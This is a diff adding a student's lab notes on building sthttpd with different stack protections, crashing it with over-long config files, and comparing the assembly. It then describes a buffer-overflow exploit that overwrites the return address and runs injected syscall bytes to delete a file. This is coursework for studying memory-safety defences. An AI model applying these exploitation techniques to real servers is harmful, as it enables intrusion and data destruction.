@@ -1,0 +1,329 @@
+1) I copied patch from webpage to a text editor in Windows and
+then did scp bad-news.patch jeffreyl@lnxsrv.seas.ucla.edu:~/CS33/smashinglab/sthttpd-2.27.0/src/
+patch -p2 < bad-news.patch
+
+
+	(Stripping trailing CRs from patch; use --binary to disable.)
+	patching file thttpd.c
+	(Stripping trailing CRs from patch; use --binary to disable.)
+	patching file libhttpd.c
+	patch unexpectedly ends in middle of line
+	Hunk #1 succeeded at 4078 with fuzz 2.
+
+So that tells me that I was slightly dumb in saving the patch in
+Windows first because of the stupid formatting of text files, but
+regardless, it worked. I did which gcc, which outputted
+usr/local/cs/bin/gcc as expected.
+
+2) Then, I configured the patched sthttpd.
+./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc
+   -dumpversion)/lib"
+
+Then, I made all the different servers, albeit with some trouble.
+
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+The only interesting thing that came of this were a couple of lines
+about implicit declarations of functions, otherwise nothing exciting
+came of it.
+
+Then I did:
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+So this just removed all of the executables and static libraries and
+things and then rebuilt with the compiler options listed in the spec.
+
+As shown in part 3, it didn't work off the bat!
+
+I ultimately had to add the extra flag "-static-libasan" to make it
+not give the error later on about wrong ELF class.
+
+Lastly:
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+Same as previous. Nothing terribly exciting came of this.
+
+3) Run SP on port 12330 + 3 * (104802680 mod 293) + 1 = 12619
+Run AS on port 12330 + 3 * (104802680 mod 293) + 2 = 12620
+Run NO on port 12330 + 3 * (104802680 mod 293) + 3 = 12621
+
+src/thttpd-sp -p 12619 -D
+src/thttpd-as -p 12620 -D
+src/thttpd-no -p 12621 -D
+
+Created a foo.txt containing "Hello there!"
+
+curl http://localhost:12619/foo.txt
+curl http://localhost:12620/foo.txt
+curl http://localhost:12621/foo.txt
+
+Had trouble connecting to all servers -- only 12621 worked without a hitch and curl printed the contents of foo.txt to stdin ("Hello there!").
+
+12620: 
+src/thttpd-as: error while loading shared libraries: libasan.so.4: wrong ELF class: ELFCLASS32
+Fixed by recompiling with "-static-libasan"
+
+12619: It worked briefly and then stopped working after I logged in
+after the VPN connection reset. I tried recompiling, but that didn't
+improve things. A couple days later, I tried again and everything
+worked just fine.
+
+5) src/thttpd-sp -C bad-file.txt -p 12619 -D
+
+*** stack smashing detected ***: src/thttpd-sp terminated
+======= Backtrace: =========
+/lib64/libc.so.6(__fortify_fail+0x37)[0x7f0c1d4a7d87]
+/lib64/libc.so.6(__fortify_fail+0x0)[0x7f0c1d4a7d50]
+src/thttpd-sp[0x404edd]
+src/thttpd-sp[0x4052cf]
+src/thttpd-sp[0x403826]
+/lib64/libc.so.6(__libc_start_main+0xf5)[0x7f0c1d3b9c05]
+src/thttpd-sp[0x40438e]
+======= Memory map: ========
+00400000-00415000 r-xp 00000000 00:2d 9043494                            /w/home.14/eng/ugrad/jeffreyl/Desktop/CS33/smashinglab/sthttpd-2.27.0/src/thttpd-sp
+00614000-00615000 r--p 00014000 00:2d 9043494                            /w/home.14/eng/ugrad/jeffreyl/Desktop/CS33/smashinglab/sthttpd-2.27.0/src/thttpd-sp
+00615000-00617000 rw-p 00015000 00:2d 9043494                            /w/home.14/eng/ugrad/jeffreyl/Desktop/CS33/smashinglab/sthttpd-2.27.0/src/thttpd-sp
+00617000-00618000 rw-p 00000000 00:00 0
+00c37000-00c58000 rw-p 00000000 00:00 0                                  [heap]
+7f0c1cb5f000-7f0c1cb74000 r-xp 00000000 08:07 261138                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+7f0c1cb74000-7f0c1cd73000 ---p 00015000 08:07 261138                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+7f0c1cd73000-7f0c1cd74000 r--p 00014000 08:07 261138                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+7f0c1cd74000-7f0c1cd75000 rw-p 00015000 08:07 261138                     /usr/lib64/libgcc_s-4.8.5-20150702.so.1
+7f0c1cd75000-7f0c1cd77000 r-xp 00000000 08:07 261506                     /usr/lib64/libdl-2.17.so
+
+etc.
+
+So, then, I re-ran it with gdb: r -C bad-file.txt -p 12619 -D
+
+bt
+
+#0  0x00007ffff760e1f7 in raise () from /lib64/libc.so.6
+#1  0x00007ffff760f8e8 in abort () from /lib64/libc.so.6
+#2  0x00007ffff764df47 in __libc_message () from /lib64/libc.so.6
+#3  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6
+#4  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6
+#5  0x0000000000404edd in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#6  0x00000000004052cf in parse_args (argc=6, argv=argv@entry=0x7fffffffe1a8)
+    at thttpd.c:893
+#7  0x0000000000403826 in main (argc=<optimized out>, argv=0x7fffffffe1a8)
+    at thttpd.c:380
+
+Setting a breakpoint at line 1190, doing set disassemble-next-line on,
+and then reading the following several lines and stepping through, it
+became clear that the contents of the stack are checked with a canary
+value and if the values don't match, the process of determining what
+went wrong and where occur. The specific line in question that is
+responsible for this is:
+0x0000000000404e15 <read_config+1125>:       64 48 33 04 25 28 00 00 00     xor    %fs:0x28,%rax
+
+
+Because I'd had issues with making this server work a couple days ago,
+I'd worked on number 6 before this question. It turns out that
+"bad-file.txt" didn't work correctly for that question, but did for
+this one. So here's the contents of that file for reference (at the
+time I completed this portion of the question):
+
+cat bad-file.txt
+
+# Hello, this comment is meant to be ignored by thttpd.c, but hopefully if I make it long enough, it'll overflow the line buffer.
+# I don't know, but there's a chance that if I add several lines, it'll work.
+# Maybe another, just for kicks, as my dad is way too fond of saying.
+# I think that "just for shits and giggles" evokes a much livelier mental image than "just for kicks"
+
+So I arrived at this file by reading the contents of read_config and
+making a text file of sufficiently large size that was properly
+formatted.
+
+6) I tried crashing it first with a config file called "bad-file.txt"
+into which I'd copied much of the contents of thttpd's man page. That
+yielded an error: "src/thttpd-as: unknown config option 'OPTIONS'"
+
+So I continued trying to make a config file that would cause the
+program to truly crash. Next, I tried making a file containing just
+comments, in other words, lines preceded with "#".
+
+It didn't seem to cause the server to crash, when I expected it really
+should have, so I started investigating the code's behavior on
+gdb. Looking at the stack, using x/300xb $rsp and reading the assembly
+code, I finally understood what should have been glaringly obvious:
+the length of my lines in "bad-file.txt" needed to be longer because
+fgets reads until "\n". So I increased the line length and it crashed
+as I'd hoped.
+
+This crashed because read_config attempted to return to a location to
+which it couldn't.
+
+x/xw $rsp
+0x7fffffffcdb8: 0x2c726568
+
+x/xw 0x2c726568
+0x2c726568:     Cannot access memory at address 0x2c726568
+
+bt
+
+#0  0x00000000004ff089 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#1  0x73756a202c726568 in ?? ()
+#2  0x696b20726f662074 in ?? ()
+#3  0x207361202c736b63 in ?? ()
+#4  0x692064616420796d in ?? ()
+#5  0x6f74207961772073 in ?? ()
+#6  0x6f20646e6f66206f in ?? ()
+#7  0x676e697961732066 in ?? ()
+#8  0x6e6968742049202e in ?? ()
+#9  0x222074616874206b in ?? ()
+#10 0x726f66207473756a in ?? ()
+#11 0x6120737469687320 in ?? ()
+#12 0x6c6767696720646e in ?? ()
+#13 0x6b6f766520227365 in ?? ()
+#14 0x63756d2061207365 in ?? ()
+#15 0x696c6576696c2068 in ?? ()
+#16 0x61746e656d207265 in ?? ()
+#17 0x206567616d69206c in ?? ()
+#18 0x756a22206e616874 in ?? ()
+#19 0x6b20726f66207473 in ?? ()
+#20 0x000a2e22736b6369 in ?? ()
+#21 0x00000000004dad8a in __sanitizer::MmapFixedOrDie (
+    fixed_addr=8243124871066838116, size=6998674224439697524)
+    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_posix.cc:194
+#22 0x00000000005252ba in ?? ()
+#23 0x0000000000000000 in ?? ()
+
+7) I tried running the same file that crashed 5, but instead of crashing, it output an error:
+
+usage:  /u/eng/ugrad/jeffreyl/CS33/smashinglab/sthttpd-2.27.0/src/thttpd-no [-C
+ configfile] [-p port] [-d dir] [-r|-nor] [-dd data_dir] [-s|-nos] [-v|-nov] [-
+g|-nog] [-u user] [-c cgipat] [-t throttles] [-h host] [-l logfile] [-i pidfile
+] [-T charset] [-P P3P] [-M maxage] [-V] [-D]
+
+Then, using what I'd learned in number 6, I managed to crash this
+portion of code as well.
+
+The specific instruction that caused the crash was:
+0x0000000000404c8c <+1116>:  retq
+
+This crashed because the program tried to return to a location that it
+couldn't because the correct address had been overwritten:
+x/xw $rsp
+0x7fffffffcef8: 0x20732765
+
+x/xw 0x20732765
+0x20732765:     Cannot access memory at address 0x20732765
+
+bt
+
+#0  0x0000000000404c8c in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#1  0x6863206120732765 in ?? ()
+#2  0x6168742065636e61 in ?? ()
+#3  0x6120492066692074 in ?? ()
+#4  0x7265766573206464 in ?? ()
+#5  0x73656e696c206c61 in ?? ()
+#6  0x206c6c277469202c in ?? ()
+#7  0x614d202e6b726f77 in ?? ()
+#8  0x746f6e6120656279 in ?? ()
+#9  0x73756a202c726568 in ?? ()
+#10 0x696b20726f662074 in ?? ()
+#11 0x207361202c736b63 in ?? ()
+#12 0x692064616420796d in ?? ()
+#13 0x6f74207961772073 in ?? ()
+#14 0x6f20646e6f66206f in ?? ()
+#15 0x676e697961732066 in ?? ()
+#16 0x6e6968742049202e in ?? ()
+#17 0x222074616874206b in ?? ()
+#18 0x726f66207473756a in ?? ()
+#19 0x6120737469687320 in ?? ()
+#20 0x6c6767696720646e in ?? ()
+#21 0x6b6f766520227365 in ?? ()
+#22 0x63756d2061207365 in ?? ()
+#23 0x696c6576696c2068 in ?? ()
+#24 0x61746e656d207265 in ?? ()
+#25 0x206567616d69206c in ?? ()
+#26 0x756a22206e616874 in ?? ()
+#27 0x6b20726f66207473 in ?? ()
+#28 0x000a2e22736b6369 in ?? ()
+#29 0x0000000000000000 in ?? ()
+
+8) I generated the assembly files for thttpd.c three times using the
+following steps:
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd.o src/thttpd-sp.s
+make clean
+make CFLAGS='-S -O2 -fno-inline -fsanitize=address -static-libasan'
+mv src/thttpd.o src/thttpd-as.s
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd.o src/thttpd-no.s
+
+thttpd-as.s was the most verbose of the three files -- it defined more
+offsets and worked with data at a very large offset from the
+addresses stored in the registers -- 2147450880 bytes away to be
+exact. This corresponds to the mapping of real memory to shadow
+memory. Further indications of this can be found by reading the
+documentation of address sanitizer and noting that addresses of shadow
+bytes are computed as (Addr>>3)+Offset and by comparing that to the
+effect of lines 4564 and 4565. One notes the presence of many
+comparisons of the shadow byte to negative numbers; as also noted in
+the documentation, this is done to check if the byte is unaddressable
+-- this is much of the key to the address sanitizer's strategy; it
+checks that memory accesses are viable.
+
+The implementation of handle_read was much the same between
+thttpd-no.s and thttpd-sp.s. The targets differed by 10 between the
+two. Otherwise, I did not see any differences between the two
+files. Using -fstack-protector-strong results in using "canaries"
+which read from read-only sections of memory to input values in the
+stack at vulnerable places (after buffers, for example), which may be
+checked at a later point to see if there was buffer overflow (by
+xor'ing with the original value).
+
+9) Looking at this problem and reading the links contained in the
+project spec, I developed a preliminary plan for how to approach the
+problem at hand. First of all, I'll use much the same sort of approach
+that crashed the program in the previous part. I needed to figure out
+exactly how long the input file needs to be so that the buffer is
+properly filled. Contained in the debug file will be a string that
+will execute everything I want to -- I'd set the return address to
+within the buffer and then modify the stack pointer and give %rdi the
+correct address.
+
+Using x/200xb $rsp at various points in the execution of read_config,
+I came to better understand the execution of the program and was able
+to deduce the location of the return address, namely 0x7fffffffffcef8.
+Then, I did some simple math:
+0x7fffffffcef8 - 0x7fffffffce60 = 0x98 (offset to return address)
+0x98+0x8 = 0xa0 (indicates that file should be 160 bytes long)
+
+gdb src/thttpd-no
+r -p 12621 -D
+disas /r unlink
+yielded the following very helpful commands demonstrating how the
+syscall is made:
+
+   0x00007ffff76c3f70 <+0>:     b8 57 00 00 00  mov    $0x57,%eax
+   0x00007ffff76c3f75 <+5>:     0f 05   syscall
+
+Snooping around in the obdjump of thttpd-no, I found other helpful
+lines of machine code:
+48 83 ec 70             sub    $0x70,%rsp
+48 89 e7                mov    %rsp,%rdi
+
+Using those lines and knowing the address I wished to return to, I
+pieced together the gist of the exploit: return to a place within the
+buffer just after "target.txt\0" (and 8-byte aligned) and then
+subtract from the stack pointer, store the proper value in %rdi, then
+make the system call for unlink. Using hex2raw, I got the proper
+values and then, after a bit of playing around with alignment, I
+managed to unlink target.txt. The file used for this exploit is:
+"bad.txt".
